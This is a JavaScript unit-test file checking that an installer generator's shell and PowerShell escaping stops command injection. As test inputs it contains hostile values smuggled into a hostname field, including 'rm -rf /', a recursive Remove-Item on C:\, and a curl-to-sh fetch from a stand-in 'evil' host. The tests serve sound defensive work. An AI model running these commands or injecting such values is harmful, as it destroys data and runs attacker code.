/**
 * Unit tests for the installer helper functions in src/routes/installer.js.
 *
 * These build the shell and PowerShell installers that customers run on their
 * machines, so the two escape functions are an injection surface: a value that
 * escapes its quoting can run arbitrary commands as the installing user. They
 * were only ever exercised indirectly through route tests, at ~20% file
 * coverage — the largest single coverage gap in the server.
 */

const {
  escapeSh,
  escapePs1,
  getPlatformConfig,
  getReleasePlatformName,
  buildDeviceConfig,
} = require('../src/routes/installer').helpers;

describe('escapeSh — single-quoted shell literals', () => {
  test('wraps a plain value', () => {
    expect(escapeSh('abc')).toBe("'abc'");
  });

  test('escapes an embedded single quote as the shell idiom', () => {
    // 'it'\''s' — close, escaped quote, reopen
    expect(escapeSh("it's")).toBe("'it'\\''s'");
  });

  test('a command-substitution attempt cannot leave the quotes', () => {
    const evil = "a'; rm -rf / #";
    const escaped = escapeSh(evil);
    expect(escaped).toBe("'a'\\''; rm -rf / #'");
    // the payload stays inside one literal: only the intended '\'' sequences
    expect(escaped.startsWith("'")).toBe(true);
    expect(escaped.endsWith("'")).toBe(true);
  });

  test('backslashes, dollars and newlines are inert inside single quotes', () => {
    const value = 'a\\b$HOME\nc';
    expect(escapeSh(value)).toBe(`'${value}'`);
  });

  test('null and undefined become empty literals', () => {
    expect(escapeSh(null)).toBe("''");
    expect(escapeSh(undefined)).toBe("''");
  });

  test('non-strings are stringified, not dropped', () => {
    expect(escapeSh(42)).toBe("'42'");
    expect(escapeSh(false)).toBe("'false'");
  });
});

describe('escapePs1 — PowerShell single-quoted literals', () => {
  test('wraps a plain value', () => {
    expect(escapePs1('abc')).toBe("'abc'");
  });

  test('doubles an embedded single quote (PowerShell rule)', () => {
    expect(escapePs1("it's")).toBe("'it''s'");
  });

  test('a command attempt cannot leave the quotes', () => {
    const evil = "a'; Remove-Item C:\\ -Recurse -Force #";
    const escaped = escapePs1(evil);
    expect(escaped).toBe("'a''; Remove-Item C:\\ -Recurse -Force #'");
    expect(escaped.startsWith("'")).toBe(true);
    expect(escaped.endsWith("'")).toBe(true);
  });

  test('a lone quote becomes a doubled quote, not a terminator', () => {
    expect(escapePs1("'")).toBe("''''");
  });

  test('backticks and $ are inert inside single quotes', () => {
    const value = 'a`b$(whoami)';
    expect(escapePs1(value)).toBe(`'${value}'`);
  });

  test('null becomes an empty literal', () => {
    expect(escapePs1(null)).toBe("''");
  });
});

describe('getPlatformConfig', () => {
  test('windows uses .exe binaries', () => {
    expect(getPlatformConfig('win')).toEqual({
      platform: 'win',
      ext: '.exe',
      agentName: 'lockdown-agent.exe',
      watchdogName: 'lockdown-watchdog.exe',
    });
  });

  test('linux has no extension', () => {
    const cfg = getPlatformConfig('linux');
    expect(cfg.ext).toBe('');
    expect(cfg.agentName).toBe('lockdown-agent');
  });

  test('an unknown platform falls back to linux rather than throwing', () => {
    expect(getPlatformConfig('plan9').platform).toBe('linux');
  });
});

describe('getReleasePlatformName — GitHub asset naming', () => {
  test.each([
    ['win', 'windows'],
    ['mac', 'darwin'],
    ['linux', 'linux'],
    ['anything-else', 'linux'],
  ])('%s maps to %s', (input, expected) => {
    expect(getReleasePlatformName(input)).toBe(expected);
  });
});

describe('buildDeviceConfig', () => {
  const device = { hostname: 'DEV-1', id: 'abc' };
  let saved;

  beforeEach(() => {
    saved = process.env.GOOGLE_API_KEY;
    delete process.env.GOOGLE_API_KEY;
  });

  afterEach(() => {
    if (saved === undefined) delete process.env.GOOGLE_API_KEY;
    else process.env.GOOGLE_API_KEY = saved;
  });

  test('carries the fields the agent needs', () => {
    const cfg = buildDeviceConfig(device, 'https://api.example.com', 'key-123');
    expect(cfg).toMatchObject({
      server_url: 'https://api.example.com',
      device_hostname: 'DEV-1',
      api_key: 'key-123',
      poll_interval: 30,
      sign_requests: true,
      server_supports_ack_dedup: true,
      boot_lock_enabled: true,
    });
  });

  test('enrolled_at is an ISO timestamp', () => {
    const cfg = buildDeviceConfig(device, 'https://x', 'k');
    expect(Number.isNaN(Date.parse(cfg.enrolled_at))).toBe(false);
  });

  test('omits google_api_key unless the server has one', () => {
    expect(buildDeviceConfig(device, 'https://x', 'k')).not.toHaveProperty('google_api_key');
    process.env.GOOGLE_API_KEY = 'g-key';
    expect(buildDeviceConfig(device, 'https://x', 'k').google_api_key).toBe('g-key');
  });
});

describe('generated install scripts — escaping is applied, not just available', () => {
  const config = {
    server_url: 'https://api.example.com',
    device_hostname: 'DEV-1',
    api_key: 'key-123',
    poll_interval: 30,
  };

  test('install.sh embeds the escaped device fields as variables', () => {
    const { generateInstallSh } = require('../src/routes/installer').helpers;
    const sh = generateInstallSh(config, 'DEV-1');
    expect(sh.startsWith('#!/bin/bash')).toBe(true);
    expect(sh).toContain('set -e');
    expect(sh).toContain("DEVICE_HOSTNAME='DEV-1'");
    expect(sh).toContain("SERVER_URL='https://api.example.com'");
    expect(sh).toContain('/etc/lockdown-agent');
  });

  test('install.sh cannot be broken out of by a hostile hostname', () => {
    const { generateInstallSh } = require('../src/routes/installer').helpers;
    const evil = "a'; curl http://evil/x | sh #";
    const sh = generateInstallSh(config, evil);
    const line = sh.split('\n').find((l) => l.startsWith('DEVICE_HOSTNAME='));
    expect(line).toBe(`DEVICE_HOSTNAME='a'\\''; curl http://evil/x | sh #'`);
    // the raw, unescaped injection must not survive anywhere as an assignment
    expect(sh).not.toContain(`DEVICE_HOSTNAME=${evil}`);
  });

  test('install.ps1 doubles quotes so the value stays one literal', () => {
    const { generateInstallPs1 } = require('../src/routes/installer').helpers;
    const ps1 = generateInstallPs1(config, "a'; Remove-Item C:\\ -Recurse #");
    expect(ps1).toMatch(/Remove-Item/); // present as inert text
    expect(ps1).toContain("'';"); // quote doubled, not escaped shell-style
    expect(ps1).not.toContain("'\\''"); // never the POSIX idiom in a PS1 file
  });

  test('the readme states the platform and the device', () => {
    const { generateReadme } = require('../src/routes/installer').helpers;
    expect(generateReadme('DEV-1', 'win')).toMatch(/Windows/);
    expect(generateReadme('DEV-1', 'linux')).toMatch(/Linux\/macOS/);
    expect(generateReadme('DEV-1', 'win')).toContain('DEV-1');
  });

  test('the licence names the device and the authorisation terms', () => {
    const { generateNsisLicense } = require('../src/routes/installer').helpers;
    const licence = generateNsisLicense('DEV-1');
    expect(licence).toContain('DEV-1');
    expect(licence).toMatch(/authorized/i);
  });
});

describe('assembleZipFiles', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');

  test('includes binaries, config, the right install script and the notices', () => {
    const { assembleZipFiles, getPlatformConfig } = require('../src/routes/installer').helpers;
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'zip-'));
    const agent = path.join(dir, 'lockdown-agent');
    const watchdog = path.join(dir, 'lockdown-watchdog');
    fs.writeFileSync(agent, 'AGENT');
    fs.writeFileSync(watchdog, 'WATCHDOG');

    const config = { server_url: 'https://x', device_hostname: 'DEV-1', api_key: 'k' };
    const device = { hostname: 'DEV-1' };
    const platform = 'linux';
    const plat = getPlatformConfig(platform);

    const linux = assembleZipFiles(config, device, platform, agent, watchdog, plat);
    const names = linux.map((f) => f.name);
    expect(names).toContain(plat.agentName);
    expect(names).toContain(plat.watchdogName);
    expect(names).toContain('config.json');
    expect(names).toContain('install.sh');
    const cfgFile = linux.find((f) => f.name === 'config.json');
    expect(JSON.parse(cfgFile.data.toString())).toMatchObject({ device_hostname: 'DEV-1' });

    const winPlat = getPlatformConfig('win');
    const windows = assembleZipFiles(config, device, 'win', agent, null, winPlat);
    const winNames = windows.map((f) => f.name);
    expect(winNames).toContain('install.ps1');
    expect(winNames).not.toContain('install.sh');
    // no watchdog path supplied → no watchdog entry
    expect(winNames).not.toContain(winPlat.watchdogName);

    fs.rmSync(dir, { recursive: true, force: true });
  });
});
